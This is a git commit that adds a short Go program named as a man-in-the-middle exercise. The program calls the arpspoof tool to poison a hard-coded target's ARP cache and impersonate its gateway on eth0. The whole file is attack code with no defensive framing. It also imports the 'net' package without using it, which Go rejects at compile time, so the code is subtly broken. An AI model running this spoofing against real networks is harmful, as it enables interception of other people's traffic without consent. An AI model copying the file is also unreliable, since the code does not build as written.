a049a691be9828c2646dec0d203c8070c6b77e8f
MICHAELKITH <michaelkithinji27@gmail.com>
2025-07-14 23:29:41 +0300

    Man in the middle

---
+++ 04-mitm-arp-spoof/main.go
@@ -0,0 +1,18 @@
+package main
+
+import (
+    "fmt"
+    "net"
+    "os/exec"
+)
+
+func arpSpoof(targetIP, gatewayIP string) {
+    cmd := exec.Command("arpspoof", "-i", "eth0", "-t", targetIP, gatewayIP)
+    if err := cmd.Run(); err != nil {
+        fmt.Println("Error running arpspoof:", err)
+    }
+}
+
+func main() {
+    arpSpoof("192.168.1.2", "192.168.1.1")
+}
